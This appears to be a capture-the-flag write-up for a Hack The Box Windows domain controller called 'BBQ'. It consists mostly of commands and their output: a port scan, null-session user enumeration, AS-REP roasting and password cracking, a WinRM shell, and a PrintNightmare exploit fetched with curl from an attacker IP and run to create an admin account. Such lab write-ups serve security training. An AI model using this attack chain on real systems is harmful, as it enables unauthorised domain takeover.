# BBQ
```
Nmap scan report for bbq.htb (10.129.1.5)
Host is up (0.060s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-25 04:14:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
63580/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=7/25%Time=60FCACF5%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Looking at nmap we recognize a windows box that looks like a domain controller.
A null authentication allowed us to find domain users.
```
Tue Jul 27 03:23:59 wil@pwn:~/htb/business_ctf/boxes/bbq$ rpcclient bbq.htb -U ""%"" -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
[...]
user:[vparsons] rid:[0x480]
user:[vparsons_adm] rid:[0x481]
```

With impacket we found a user with DONT_REQUIRE_PREAUTH flag set. We can request a TGT for vparsons.
```
Tue Jul 27 03:25:16 wil@pwn:~/htb/business_ctf/boxes/bbq$ GetNPUsers.py MEGACORP.LOCAL/ -usersfile users.txt
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
$krb5asrep$23$vparsons@MEGACORP.LOCAL:cd58aef09c95c83f8bcb8d6ebb09c6b4$5d068b860d9e509a2cc42c3d787d0b290b64ec045501f03cb6f8d33527644c1b070b18a52dfcd299f3425fc013139dc8e0e5066b32bc1ebc90fdbd9fb1d2e56dfdb0a144ab884b8d598ea577d400b1d1f5fef1bf0b77c9a22b98fe45b483d5a24ae8a80a8c4d3e8c9eb77cf80013ad1fd2bcc50d9153b1bec18bd66c617ee6bb87a721d3ae81cc555445c7e8dd7b2d1c955808fb3f3b555203d497ea8c4aaf872a0eae9dab5203e6a02a88bf2c04225cff1fdc46d2ad7a64dec8f79adcc650be33ebc6f91333f97da9128bf206d1c7bd4cdfca3292424c5b45b40247f0a2bd698a5e4197472e175087cd6386e35abb30


Tue Jul 27 03:27:18 wil@pwn:~/htb/business_ctf/boxes/bbq$ john vparsons.hash --wordlist=/home/wil/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
serverstatus03   ($krb5asrep$23$vparsons@MEGACORP.LOCAL)
```

With this account we can get command execution with evil-winrm:
```
Tue Jul 27 03:27:55 wil@pwn:~/htb/business_ctf/boxes/bbq$ evil-winrm -u vparsons -p serverstatus03 -i bbq.htb
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\vparsons\Documents>
```

We used PrintNightmare (CVE-2021-1675) exploit to get user and root flag.
```
*Evil-WinRM* PS C:\windows\temp\mine> curl 10.10.14.27/CVE-2021-1675.ps1 -o CVE-2021-1675.ps1
*Evil-WinRM* PS C:\windows\temp\mine> . .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\windows\temp\mine> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\vparsons\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_2097e02ea77b432e\Amd64\mxdwdrv.dll"                                                                                       
[+] added user  as local administrator
[+] deleting payload from C:\Users\vparsons\AppData\Local\Temp\nightmare.dll
```

```
Tue Jul 27 03:31:38 wil@pwn:~/htb/business_ctf/boxes/bbq$ evil-winrm -u adm1n -p 'P@ssw0rd' -i bbq.htb
*Evil-WinRM* PS C:\Users\adm1n\Documents> cat /users/administrator/desktop/root.txt
HTB{pls_turn_0ff_th3_pr1nt3r}
*Evil-WinRM* PS C:\Users\adm1n\Documents> cat /users/vparsons_adm/desktop/user.txt
HTB{dp@pi_r0ast1ng}
```